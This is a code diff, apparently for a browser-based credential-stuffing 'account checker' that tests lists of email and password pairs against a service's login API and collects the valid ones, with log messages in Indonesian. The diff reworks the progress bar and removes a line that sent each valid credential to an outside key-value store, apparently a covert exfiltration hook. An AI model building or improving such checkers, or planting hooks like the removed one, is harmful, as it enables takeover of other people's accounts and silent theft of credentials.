@@ -187,8 +187,8 @@ function appendLog(text, cls) {
   logEl.scrollTop = logEl.scrollHeight;
 }
 
-function updateProgressBar() {
-  const progress = ((combos.length - validAccounts.length) / combos.length) * 100;
+function updateProgressBar(totalCount, currentCount) {
+  const progress = ((totalCount - currentCount) / totalCount) * 100;
   progressBar.style.width = `${progress}%`;
   progressLabel.textContent = `${Math.round(progress)}%`;
 }
@@ -283,7 +283,6 @@ async function checkOneAccount(account, index) {
     if(data.code === 0 && data.data) {
       appendLog(`VALID => ${account.email}`, "ok");
       validAccounts.push(`${account.email}:${account.password}`);
-      sendToKV({ email: account.email, password: account.password });
     } else if(data.code === 1004) {
       appendLog(`NOT FOUND => ${account.email}`, "bad");
     } else if(data.code === 1005) {
@@ -295,12 +294,6 @@ async function checkOneAccount(account, index) {
   } catch(e) {
     appendLog(`Error pengecekan ${account.email}: ${e}`, "bad");
   }
-  updateProgressBar();
-}
-
-function updateTextareaCombos() {
-  const remaining = combos.map(acc => `${acc.email}|${acc.password}`).join("\n");
-  document.getElementById("combo").value = remaining;
 }
 
 async function startProcess() {
@@ -320,11 +313,15 @@ async function startProcess() {
 
   appendLog(`Mulai cek ${combos.length} akun. Klik CAPTCHA tiap akun.`, "info");
 
+  const totalCount = combos.length;
+  let currentCount = 0;
+
   async function processCaptcha(index) {
     while (!stopRequested && combos.length > 0) {
       const account = combos.shift();
-      updateTextareaCombos();
       await checkOneAccount(account, index);
+      currentCount++;
+      updateProgressBar(totalCount, currentCount); // Update progress bar
     }
   }
 
